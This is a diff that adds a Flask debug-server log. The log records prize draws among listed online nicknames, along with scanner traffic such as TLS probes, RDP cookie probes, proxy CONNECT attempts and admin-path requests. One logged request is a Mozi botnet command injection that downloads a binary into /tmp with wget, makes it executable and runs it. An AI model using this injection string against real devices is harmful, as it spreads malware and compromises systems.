@@ -1,0 +1,460 @@
+ * Serving Flask app 'main'
+ * Debug mode: on
+INFO:werkzeug:[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:8081
+ * Running on http://10.1.1.4:8081
+INFO:werkzeug:[33mPress CTRL+C to quit[0m
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 190-361-937
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['菓子-月跡', 'Prelighting_', 'YURIN-TOXIC', '大型强化玻璃', '渡辺千叶', '飛鳥啲悲傷ASUKA', '条_Offcial', '了不起的呵呵君', 'DOORRRRR流', 'TUTU君', 'Nanarikom', '丿丿三红航空', '茵茵Miya全肯定bot', '世界爆炸扎比子', '阿昱-910', 'BETA_REBORN', '镜明丶', '小湾睡觉', 'Cure_Makimaki', '五十嵐矢', 'Anyouchuan', '欢闪闪', '夜子吱吱丶', 'WARUDOKAOSU_info', '浣熊仔在垃圾桶安家', 'CardinaI_', '五十三535353', '威思睿', '麦麦今天吃什么', '世良小姐的信徒kita_', '爱猫上班族', '刹那梦海', '杂交七月犬', '0v0_kita', '-Azzzuuu-', '晴雨-Seiu', '小炫咩呜', 'm0_137mo3', '空白爱喝丢丢', '小狼炸蘑菇咕咕咕', 'Subaru_路人乙', '封风凌', '78Yizumi_', '椒盐比格', '依默也是芒果OAO', '輪廻丶', '凹_孤魂野鬼', 'Xsphere2845', '卖报纸就找我', '深秋的晚宴与天空树', '红鼻子的米鹿', '随遇而安TeaZ', 'gbcck', '奈奈奈奈特1', '徹夜部_AllNight', '好想喝快乐柠檬', 'rektboiz', '豚丼-', '俗物zokubutsu', 'HIGUCHI-TOXIC', 'MrBiggerWorse比格沃斯', '晨羽Calvin____', '-茕立-', '兰H亚里亚', '热心观众某光', '风摇不动的铃', '芙兰朵露君', '夜羽夜羽耶', 'Frederick铸洲', 'Serika厨', 'Tenke1_Mae5h1ma', '無聲de軒', '空心菜籽油', '清风_ouo', '文月Rika_L0111POP', '七梦TAT', 'Takasago_Keisei', '梓色蛙声', '蓝狼_Dehydrated', '羊驼驼y托', '爱本宝宝的安安', '哇咔咔乌拉唔啦', '连川的Cello', 'Air鸡参', '伤诚君_Riko理理专属夸夸Bot', '橘猫Masashi', '纯良抽象老头后排睡觉现场派', '西野七七七七七', '棠照Tanwzao', '来把你麦开开来', '泠-Amemiya', 'REI-TOXIC', '晓安lll', 'LQ你就是个不求上进的傻消音']
+INFO:main:中奖者：MrBiggerWorse比格沃斯
+INFO:werkzeug:127.0.0.1 - - [16/Jul/2024 14:48:31] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['菓子-月跡', 'Prelighting_', 'YURIN-TOXIC', '大型强化玻璃', '渡辺千叶', '飛鳥啲悲傷ASUKA', '条_Offcial', '了不起的呵呵君', 'DOORRRRR流', 'TUTU君', 'Nanarikom', '丿丿三红航空', '茵茵Miya全肯定bot', '世界爆炸扎比子', '阿昱-910', 'BETA_REBORN', '镜明丶', '小湾睡觉', 'Cure_Makimaki', '五十嵐矢', 'Anyouchuan', '欢闪闪', '夜子吱吱丶', 'WARUDOKAOSU_info', '浣熊仔在垃圾桶安家', 'CardinaI_', '五十三535353', '威思睿', '麦麦今天吃什么', '世良小姐的信徒kita_', '爱猫上班族', '刹那梦海', '杂交七月犬', '0v0_kita', '-Azzzuuu-', '晴雨-Seiu', '小炫咩呜', 'm0_137mo3', '空白爱喝丢丢', '小狼炸蘑菇咕咕咕', 'Subaru_路人乙', '封风凌', '78Yizumi_', '椒盐比格', '依默也是芒果OAO', '輪廻丶', '凹_孤魂野鬼', 'Xsphere2845', '卖报纸就找我', '深秋的晚宴与天空树', '红鼻子的米鹿', '随遇而安TeaZ', 'gbcck', '奈奈奈奈特1', '徹夜部_AllNight', '好想喝快乐柠檬', 'rektboiz', '豚丼-', '俗物zokubutsu', 'HIGUCHI-TOXIC', 'MrBiggerWorse比格沃斯', '晨羽Calvin____', '-茕立-', '兰H亚里亚', '热心观众某光', '风摇不动的铃', '芙兰朵露君', '夜羽夜羽耶', 'Frederick铸洲', 'Serika厨', 'Tenke1_Mae5h1ma', '無聲de軒', '空心菜籽油', '清风_ouo', '文月Rika_L0111POP', '七梦TAT', 'Takasago_Keisei', '梓色蛙声', '蓝狼_Dehydrated', '羊驼驼y托', '爱本宝宝的安安', '哇咔咔乌拉唔啦', '连川的Cello', 'Air鸡参', '伤诚君_Riko理理专属夸夸Bot', '橘猫Masashi', '纯良抽象老头后排睡觉现场派', '西野七七七七七', '棠照Tanwzao', '来把你麦开开来', '泠-Amemiya', 'REI-TOXIC', '晓安lll', 'LQ你就是个不求上进的傻消音']
+INFO:main:中奖者：随遇而安TeaZ, rektboiz, 连川的Cello, 世界爆炸扎比子, 依默也是芒果OAO, 飛鳥啲悲傷ASUKA
+INFO:werkzeug:127.0.0.1 - - [16/Jul/2024 14:48:52] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['菓子-月跡', 'Prelighting_', 'YURIN-TOXIC', '大型强化玻璃', '渡辺千叶', '飛鳥啲悲傷ASUKA', '条_Offcial', '了不起的呵呵君', 'DOORRRRR流', 'TUTU君', 'Nanarikom', '丿丿三红航空', '茵茵Miya全肯定bot', '世界爆炸扎比子', '阿昱-910', 'BETA_REBORN', '镜明丶', '小湾睡觉', 'Cure_Makimaki', '五十嵐矢', 'Anyouchuan', '欢闪闪', '夜子吱吱丶', 'WARUDOKAOSU_info', '浣熊仔在垃圾桶安家', 'CardinaI_', '五十三535353', '威思睿', '麦麦今天吃什么', '世良小姐的信徒kita_', '爱猫上班族', '刹那梦海', '杂交七月犬', '0v0_kita', '-Azzzuuu-', '晴雨-Seiu', '小炫咩呜', 'm0_137mo3', '空白爱喝丢丢', '小狼炸蘑菇咕咕咕', 'Subaru_路人乙', '封风凌', '78Yizumi_', '椒盐比格', '依默也是芒果OAO', '輪廻丶', '凹_孤魂野鬼', 'Xsphere2845', '卖报纸就找我', '深秋的晚宴与天空树', '红鼻子的米鹿', '随遇而安TeaZ', 'gbcck', '奈奈奈奈特1', '徹夜部_AllNight', '好想喝快乐柠檬', 'rektboiz', '豚丼-', '俗物zokubutsu', 'HIGUCHI-TOXIC', 'MrBiggerWorse比格沃斯', '晨羽Calvin____', '-茕立-', '兰H亚里亚', '热心观众某光', '风摇不动的铃', '芙兰朵露君', '夜羽夜羽耶', 'Frederick铸洲', 'Serika厨', 'Tenke1_Mae5h1ma', '無聲de軒', '空心菜籽油', '清风_ouo', '文月Rika_L0111POP', '七梦TAT', 'Takasago_Keisei', '梓色蛙声', '蓝狼_Dehydrated', '羊驼驼y托', '爱本宝宝的安安', '哇咔咔乌拉唔啦', '连川的Cello', 'Air鸡参', '伤诚君_Riko理理专属夸夸Bot', '橘猫Masashi', '纯良抽象老头后排睡觉现场派', '西野七七七七七', '棠照Tanwzao', '来把你麦开开来', '泠-Amemiya', 'REI-TOXIC', '晓安lll', 'LQ你就是个不求上进的傻消音']
+INFO:main:中奖者：奈奈奈奈特1, 镜明丶, 菓子-月跡, 红鼻子的米鹿, 卖报纸就找我, 78Yizumi_
+INFO:werkzeug:127.0.0.1 - - [16/Jul/2024 14:52:06] "POST /api/draw HTTP/1.0" 200 -
+ERROR:werkzeug:96.126.104.20 - - [16/Jul/2024 15:10:24] code 400, message Bad request version ('V1\x86|é')
+INFO:werkzeug:96.126.104.20 - - [16/Jul/2024 15:10:24] "[35m[1m\x16\x03\x01\x00ò\x01\x00\x00î\x03\x03 ìº^w¿\x99\x987U)jûÈ3¾|'V­4Ï\x1fTkk\x90)[w¤= V1\x86|é[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:96.126.104.20 - - [16/Jul/2024 15:10:24] "[33mGET /signin HTTP/1.1[0m" 404 -
+ERROR:werkzeug:13.88.1.201 - - [16/Jul/2024 15:56:37] code 400, message Bad request syntax ('MGLNDD_20.163.199.189_8081')
+INFO:werkzeug:13.88.1.201 - - [16/Jul/2024 15:56:37] "[35m[1mMGLNDD_20.163.199.189_8081[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:147.185.132.225 - - [16/Jul/2024 16:28:26] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:198.235.24.152 - - [16/Jul/2024 16:53:22] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:198.235.24.152 - - [16/Jul/2024 16:53:22] "[35m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03Vp\x94ãÕ\x0c\x93¹\x1fñ\x81(\x17º°\x04\x1dö\x80ß\x9f²ÌzsÕq|ô\x13ÔO U\x8cë¨I(ëe´\x82õ+\x0f­z\x0d¤\x0ez\x14àô&E5u£&\x1eX<~\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:198.235.24.152 - - [16/Jul/2024 16:53:22] code 400, message Bad request version ('À(À$À\x14À')
+INFO:werkzeug:198.235.24.152 - - [16/Jul/2024 16:53:22] "[35m[1m\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03Îb\x9c\x08~¶B\x9b¥\x0c\x17\x04Ð-¦G\x014\x0bªÒµÏ\x98\x89-f\x98p\x04\x94l\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:88.214.25.63 - - [16/Jul/2024 18:06:31] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+INFO:werkzeug:88.214.25.63 - - [16/Jul/2024 18:06:31] "[35m[1m\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:83.97.73.245 - - [16/Jul/2024 18:49:28] "[33mGET /jars HTTP/1.1[0m" 404 -
+INFO:werkzeug:94.156.8.93 - - [16/Jul/2024 19:27:54] "[33mCONNECT 45.61.137.126:7227 HTTP/1.1[0m" 404 -
+INFO:werkzeug:36.99.136.137 - - [16/Jul/2024 19:55:50] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:111.7.100.32 - - [16/Jul/2024 19:57:46] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:45.15.18.72 - - [16/Jul/2024 19:57:46] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:64.62.156.33 - - [16/Jul/2024 20:04:23] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:64.62.156.35 - - [16/Jul/2024 20:04:42] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:64.62.156.35 - - [16/Jul/2024 20:04:59] "[33mGET http://api.ipify.org/?format=json HTTP/1.1[0m" 404 -
+INFO:werkzeug:64.62.156.25 - - [16/Jul/2024 20:05:01] "[33mCONNECT www.shadowserver.org:443 HTTP/1.1[0m" 404 -
+ERROR:werkzeug:64.62.156.43 - - [16/Jul/2024 20:58:48] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:64.62.156.43 - - [16/Jul/2024 20:58:48] "[35m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x12y¡\x1d.ÃÚP:\x98Åý\x85±ßI9/Ul\x86«\x94ÕÃkÏIð±q\x80\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:152.32.234.184 - - [16/Jul/2024 21:22:47] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:152.32.234.184 - - [16/Jul/2024 21:22:48] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:152.32.234.184 - - [16/Jul/2024 21:22:48] "[35m[1m\x16\x03\x01\x00ò\x01\x00\x00î\x03\x03Z\x1b"\x983~ýÀ\x13^óÚ¼D\x9d\x05ï\x15WRi\x00£\x9a³²A\x04k\x87\x99l [Z*\x7f*º&\x9c²ÕøíQIØÙD$(\x9bURMCésÅÚ\x06R»\x08\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:152.32.234.184 - - [16/Jul/2024 21:22:48] code 400, message Bad HTTP/0.9 request type ('t3')
+INFO:werkzeug:152.32.234.184 - - [16/Jul/2024 21:22:48] "[35m[1mt3 12.1.2[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:185.242.226.26 - - [16/Jul/2024 22:58:00] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:185.242.226.26 - - [16/Jul/2024 22:58:00] "[35m[1m\x16\x03\x01\x00\x8c\x01\x00\x00\x88\x03\x03£²\x01\x14\x9c)4\x9cËG$V\x0e r\x92|ó5qÏ!\x8c\x16ÿ4\x04Ìl&$\x8b\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:80.75.212.75 - - [17/Jul/2024 00:29:27] "[33mCONNECT www.google.com:443 HTTP/1.1[0m" 404 -
+ERROR:werkzeug:80.75.212.75 - - [17/Jul/2024 00:46:44] code 400, message Bad request syntax ('\x04\x01\x01»\x8eú³Ä\x00')
+INFO:werkzeug:80.75.212.75 - - [17/Jul/2024 00:46:44] "[35m[1m\x04\x01\x01»\x8eú³Ä\x00[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:80.75.212.75 - - [17/Jul/2024 00:46:48] code 400, message Bad request syntax ('\x05\x01\x00')
+INFO:werkzeug:80.75.212.75 - - [17/Jul/2024 00:46:48] "[35m[1m\x05\x01\x00[0m" HTTPStatus.BAD_REQUEST -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['emptyislandtour', '一见生贝才', '猫定在画画', 'Hinataco-空流', '畢竟我們都只是玩世不恭的幽靈啊', 'Trouble-Eater', '萨瓦兰蛋糕文明', 'SourVeFish', '奇异对联式悲歌', '半透明少女關係', 'BJ白鲸', 'Ksk宇宙飛行士1969', '三栖羊头', '最好不要想太多8', '脂脂水腥-v-', '被遗弃的孩子啊用力呼吸吧', '睡觉是最伟大的发明', 'heihe_', 'akziqi', '香饼干的小小三花酵母', '不协调奏', 'sssssss_sssc', '棚内禁止吃东西-', '用户7727722841', 'Wolf-FDcat', '五月喵喵喵', '你多喝水吧', '疯猴子111', '草莓果酱与鲜奶泡芙', '板烧麦呢鸡腿堡', '一瘸一拐的夜光烤肉', '圆桌骑士饲养员', 'Zirconium_H2O', 'mimelie', '卑微小默22644', '建议你看开点', '西沢病', '没事可以画我oc', '总之今天也是一事无成', '梵氿', '不朽腐王', 'Schizonepetae', 'yiu_粘稠糖苏', 'riiverr', 'CAREFREEEEEEEEE', '我住垃圾桶', '_不要悲伤', '这个列表很孤独', '-纸伞鸭-', 'ahiijlouuz', 'Isaaconverse', '枫月天狗', '世界无应答', '云雾栖', '狂恋丑猫', 'FINNX_XX', '嗡嗡嗡嘛嗡嗡嗡', '常记叁草青青', '耳耳e_er', '一草全', '--飞觞醉月--', '-Ecallis-', '-厨病激発-', '梨记烧腊店', 'SUXNAX08', '瓶子_DM入坑中', '灯芯砼', '一般路过麦乐鸡块', '汪死水要日涂', 'manmadechuu', '灼灼贺', 'SYQ大大', '_jihoku', '吞夢_人']
+INFO:main:中奖者：不朽腐王
+INFO:werkzeug:127.0.0.1 - - [17/Jul/2024 01:01:15] "POST /api/draw HTTP/1.0" 200 -
+INFO:werkzeug:80.76.49.105 - - [17/Jul/2024 02:04:50] "[33mCONNECT 193.149.189.126:7227 HTTP/1.1[0m" 404 -
+INFO:werkzeug:198.235.24.151 - - [17/Jul/2024 02:08:08] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:83.97.73.245 - - [17/Jul/2024 02:36:29] "[33mGET /jars HTTP/1.1[0m" 404 -
+ERROR:werkzeug:216.218.206.68 - - [17/Jul/2024 08:33:51] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03buIµ±ve+k\x9e«Ði\x02ËçOTì\x9dô¿Áÿ\x91»\x83âÔÑp\x83\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+INFO:werkzeug:216.218.206.68 - - [17/Jul/2024 08:33:51] "[35m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03buIµ±ve+k\x9e«Ði\x02ËçOTì\x9dô¿Áÿ\x91»\x83âÔÑp\x83\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:205.210.31.135 - - [17/Jul/2024 08:48:47] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:80.75.212.75 - - [17/Jul/2024 09:44:55] "[33mCONNECT www.google.com:443 HTTP/1.1[0m" 404 -
+INFO:werkzeug:172.206.217.202 - - [17/Jul/2024 09:49:25] "[33mGET / HTTP/1.0[0m" 404 -
+INFO:werkzeug:172.206.217.202 - - [17/Jul/2024 09:53:24] "[33mGET /flumemaster.jsp HTTP/1.1[0m" 404 -
+INFO:werkzeug:172.206.217.202 - - [17/Jul/2024 09:53:24] "[33mGET /rs-status HTTP/1.1[0m" 404 -
+INFO:werkzeug:172.206.217.202 - - [17/Jul/2024 09:53:42] "[33mGET /master.jsp HTTP/1.1[0m" 404 -
+ERROR:werkzeug:80.75.212.75 - - [17/Jul/2024 10:14:42] code 400, message Bad request syntax ('\x05\x01\x00')
+INFO:werkzeug:80.75.212.75 - - [17/Jul/2024 10:14:42] "[35m[1m\x05\x01\x00[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:205.210.31.42 - - [17/Jul/2024 10:18:23] "[33mGET / HTTP/1.0[0m" 404 -
+ERROR:werkzeug:46.101.1.164 - - [17/Jul/2024 10:52:51] code 400, message Bad request version ('V\x81ÏÎÒ6ïÚòdíÕ\x80\x10¹!¸\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À')
+INFO:werkzeug:46.101.1.164 - - [17/Jul/2024 10:52:51] "[35m[1m\x16\x03\x01\x01ý\x01\x00\x01ù\x03\x03>ÌS\x1d0s*W~Êõ¾ý\x7f\x85V\x81ÏÎÒ6ïÚòdíÕ\x80\x10¹!¸\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:172.206.143.231 - - [17/Jul/2024 11:55:04] "[33mGET /manager/html HTTP/1.1[0m" 404 -
+INFO:werkzeug:198.235.24.177 - - [17/Jul/2024 12:05:22] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:148.153.56.82 - - [17/Jul/2024 12:56:30] "[33mGET /In3r HTTP/1.1[0m" 404 -
+INFO:werkzeug:148.153.56.82 - - [17/Jul/2024 12:56:30] "[33mGET /AoSZ HTTP/1.1[0m" 404 -
+INFO:werkzeug:148.153.56.82 - - [17/Jul/2024 12:56:30] "[33mGET /aab8 HTTP/1.1[0m" 404 -
+INFO:werkzeug:148.153.56.82 - - [17/Jul/2024 12:56:30] "[33mGET /jquery-3.3.1.slim.min.js HTTP/1.1[0m" 404 -
+INFO:werkzeug:148.153.56.82 - - [17/Jul/2024 12:56:31] "[33mGET /aab9 HTTP/1.1[0m" 404 -
+INFO:werkzeug:148.153.56.82 - - [17/Jul/2024 12:56:31] "[33mGET /jquery-3.3.2.slim.min.js HTTP/1.1[0m" 404 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['芙蕖公子', 'Sevillor', '小雾Lucky', '刃也刃下心', '我爱的少年有世界上最好看的侧脸', '坏孩子阿比泡泡', '涧上清秋', '可可蛛', '你要吃土豆小鸭吗', '空调二十八度', '织星931', '小徐用南瓜砸死你哦', '心臟地震-', '9墨_秽土转生版', '云雾已经是您的好友啦', 'icy猫ovo', '拷打猫头鹰', '随露予风', '圭圭圭鱼', '咕鸟鸟', '电子糖浆', '拂醉银', '舒舒小鱼儿', '2000碳基废人', '什么时候睡觉好呢', 'munorLu', '老斯基sp', '小狗伏加特', '名字啥都无所谓', '兔绒椰椰', 'moneymoneyloveme', 'DollFull-Studio', '棉签不是棉', '吃一口卷卷卷卷', '喻白不白', '久九每天欧气满满', '可不可以不要离我越来越遥远', 'SettingDust', '来一口生煎嘛', '一十一山己几方人疋', '水魔小姐', '冰幽月昙', '橙子味本哥最好吃', '馄饨乐自如', '用户6516186240', 'Elueb', '苦术和一', '郁娇大叔文体', '奶油六月吻', '请救救花瓶', '卫阿峤', '蝎子莱莱恶霸', '靳琨耶', 'ricerstrix', '尘香_阿莱克斯塔萨激推版ver', 'Morass_zzZ', '自在yo_', '魔女序列1', '慈母手中线游子身上衣临行密密缝', '宅宅宅宅龙', 'Alpacaaaa_03', '拜拜拜拜83465', '自养型猫猫', '脊柱侧弯菊列', '莫涟漪晨', '墨小七202305', '顾珒衡', '-LDexter-']
+INFO:main:中奖者：舒舒小鱼儿
+INFO:werkzeug:127.0.0.1 - - [17/Jul/2024 13:41:27] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['芙蕖公子', 'Sevillor', 'knight_14373', '琳琅生-山海', '9墨_秽土转生版', '_-blacksheep-_', '月宫琴音', '舒舒小鱼儿', '什么时候睡觉好呢', '棉签不是棉', '吃一口卷卷卷卷', '成为土豆软糯土豆', '水魔小姐', '一十一山己几方人疋', '提风鹞tfy', 'Morass_zzZ', '脊柱侧弯菊列', '一年修改一次昵称oLo', '顾珒衡', '云雾已经是您的好友啦', '-LDexter-', '刃也刃下心', '我爱的少年有世界上最好看的侧脸', '涧上清秋', '可可蛛', '空调二十八度', '楚随-Raven', '心臟地震-', '拂醉银', '名字啥都无所谓', '小狗伏加特', 'munorLu', '廿廿廿廿茶茶', 'moneymoneyloveme', '可不可以不要离我越来越遥远', '来一口生煎嘛', '奶油六月吻', '七晌八睱_', 'ricerstrix', '西西西呱_', '织星931', '小徐用南瓜砸死你哦', 'icy猫ovo', '电子糖浆', '2000碳基废人', '咸味的糖糖', '冰幽月昙', '苦术和一', '郁娇大叔文体', '蝎子莱莱恶霸', '靳琨耶', '尘香_阿莱克斯塔萨激推版ver', '慈母手中线游子身上衣临行密密缝', 'Alpacaaaa_03', '自养型猫猫', '莫涟漪晨', '小雾Lucky', '123怎么你了', '坏孩子阿比泡泡', '你要吃土豆小鸭吗', '萌呆呆的老鼠大人', '拷打猫头鹰', '随露予风', '圭圭圭鱼', '咕鸟鸟', '老斯基sp', '兔绒椰椰', 'DollFull-Studio', '久九每天欧气满满', '喻白不白', 'SettingDust', '橙子味本哥最好吃', '馄饨乐自如', '用户6516186240', 'Elueb', '请救救花瓶', '卫阿峤', '超大只气泡', 'Aomori_kohaku', '自在yo_', '魔女序列1', '拜拜拜拜83465', '宅宅宅宅龙', '墨小七202305']
+INFO:main:中奖者：成为土豆软糯土豆
+INFO:werkzeug:127.0.0.1 - - [17/Jul/2024 13:42:28] "POST /api/draw HTTP/1.0" 200 -
+ERROR:werkzeug:117.248.162.2 - - [17/Jul/2024 14:28:10] code 400, message Bad HTTP/0.9 request type ("27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}Mozi.7;${IFS}busybox${IFS}wget${IFS}http://%s:%d/Mozi.7;${IFS}chmod${IFS}777${IFS}Mozi.7;${IFS}./Mozi.7'%0A%27&loginUser=a&loginPwd=a")
+INFO:werkzeug:117.248.162.2 - - [17/Jul/2024 14:28:10] "[35m[1m27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}Mozi.7;${IFS}busybox${IFS}wget${IFS}http://%s:%d/Mozi.7;${IFS}chmod${IFS}777${IFS}Mozi.7;${IFS}./Mozi.7'%0A%27&loginUser=a&loginPwd=a HTTP/1.0[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:199.45.155.105 - - [17/Jul/2024 14:51:16] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:199.45.155.105 - - [17/Jul/2024 14:51:20] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:199.45.155.105 - - [17/Jul/2024 14:51:20] code 505, message Invalid HTTP version (2.0)
+INFO:werkzeug:199.45.155.105 - - [17/Jul/2024 14:51:20] "[35m[1mPRI * HTTP/2.0[0m" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+ERROR:werkzeug:96.126.104.20 - - [17/Jul/2024 15:01:11] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:96.126.104.20 - - [17/Jul/2024 15:01:11] "[35m[1m\x16\x03\x01\x00ò\x01\x00\x00î\x03\x03Xø¤\x8c\x80>A%\x9f×"XyÊ¿'e\x90è½ìQÏvzóþ\x02).\x86ï \x9a°§¨\x1eP\x0fOÐI¨@ö\x9f\x88Þõ\x11ÿo?ÜÐ®ñ\x05¡\x8e¼J\x1dY\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:96.126.104.20 - - [17/Jul/2024 15:01:11] "[33mGET /signin HTTP/1.1[0m" 404 -
+INFO:werkzeug:65.49.1.101 - - [17/Jul/2024 15:15:38] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:65.49.1.94 - - [17/Jul/2024 15:15:48] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:65.49.1.95 - - [17/Jul/2024 15:16:04] "[33mGET http://api.ipify.org/?format=json HTTP/1.1[0m" 404 -
+INFO:werkzeug:65.49.1.107 - - [17/Jul/2024 15:16:15] "[33mCONNECT www.shadowserver.org:443 HTTP/1.1[0m" 404 -
+INFO:werkzeug:8.219.176.224 - - [17/Jul/2024 15:42:49] "[33mGET / HTTP/1.0[0m" 404 -
+ERROR:werkzeug:205.210.31.40 - - [17/Jul/2024 16:41:49] code 400, message Bad request version ('ÈÅ_\x0275O{4')
+INFO:werkzeug:205.210.31.40 - - [17/Jul/2024 16:41:49] "[35m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03±`ê<Þ\x1f£M\x89\x16åx/i\x9a:Íë¸fF\x82éÊ\x04\x14ó\x95|X'± ÈÅ_\x0275O{4[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:205.210.31.40 - - [17/Jul/2024 16:41:49] code 400, message Bad request version ('À(À$À\x14À')
+INFO:werkzeug:205.210.31.40 - - [17/Jul/2024 16:41:49] "[35m[1m\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03øå#ËÕ¦\x8eéÐî\x83ÉWMí¼\x96Î\x07V*±\x1aé\x0d\x11,õb\x95W\x91\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:194.165.16.73 - - [17/Jul/2024 17:04:28] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+INFO:werkzeug:194.165.16.73 - - [17/Jul/2024 17:04:28] "[35m[1m\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:80.75.212.75 - - [17/Jul/2024 17:24:05] "[33mCONNECT www.google.com:443 HTTP/1.1[0m" 404 -
+ERROR:werkzeug:80.75.212.75 - - [17/Jul/2024 17:53:51] code 400, message Bad request syntax ('\x05\x01\x00')
+INFO:werkzeug:80.75.212.75 - - [17/Jul/2024 17:53:51] "[35m[1m\x05\x01\x00[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:205.210.31.135 - - [17/Jul/2024 18:31:28] code 400, message Bad request version ('À\x13À')
+INFO:werkzeug:205.210.31.135 - - [17/Jul/2024 18:31:28] "[35m[1m\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03u4®\x0e\x0dþ~Aª\x9e)ÛpD\x1f|©ñ¶\x93ÑÁ\x9dDHìê\x98¬:Ìw «7\x0f½^©\x82%à×¦ÒkL\x8bQ5ÅÊ\x15¹\x1cM¥J'\x8c\x02ÃÞ\x1ck\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À[0m" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:205.210.31.135 - - [17/Jul/2024 18:31:28] code 400, message Bad request version ('À(À$À\x14À')
+INFO:werkzeug:205.210.31.135 - - [17/Jul/2024 18:31:28] "[35m[1m\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03\x9fËãÈâe\x1cS¥£w t}i=¨\x9a¬V\x9euÅò\x10B¿½j\x9bj\x85\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:5.10.250.79 - - [17/Jul/2024 18:34:56] "[33mGET /SetupWizard.aspx/ HTTP/1.1[0m" 404 -
+INFO:werkzeug:94.156.8.70 - - [17/Jul/2024 18:56:20] "[33mCONNECT 45.61.137.126:7227 HTTP/1.1[0m" 404 -
+INFO:werkzeug:83.97.73.245 - - [17/Jul/2024 19:29:09] "[33mGET /jars HTTP/1.1[0m" 404 -
+INFO:main:文件内容未变化。
